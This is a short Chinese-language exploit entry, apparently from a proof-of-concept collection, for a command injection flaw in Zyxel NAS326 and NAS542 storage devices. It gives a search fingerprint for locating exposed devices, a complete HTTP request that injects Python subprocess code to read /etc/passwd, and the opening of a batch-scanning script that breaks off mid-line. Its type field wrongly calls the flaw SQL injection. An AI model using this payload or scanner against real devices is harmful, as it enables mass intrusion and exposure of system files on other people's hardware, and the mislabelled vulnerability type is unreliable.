# ZyxelNAS326、NAS542命令注入漏洞

- **系统**：ZyxelNAS326、NAS542命令　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="NAS542"`
- **请求**：`GET /cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+and+False+or+__import__("subprocess").check_output("cat+/etc/passwd",+shell=True)%23 HTTP/1.1`
- **关键头**：`Content-Type: application/json`
- **预期**：200　|　—

**其他**
- 批量检测: | 批量检测：<br/>python poc.py -f url.txt<br/>单个检测：<br/>python poc.py -u https://your-ip<br/><br/>import requests<br/>import argparse<br/>import urllib3<br/>import random<br/>import time<br/>from concurrent.futures import ThreadPoolExecutor, as_completed<br/>from urllib.parse import urlparse, urlunparse<br/># 禁用SSL警告<br/>urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br/>DEFAULT_TI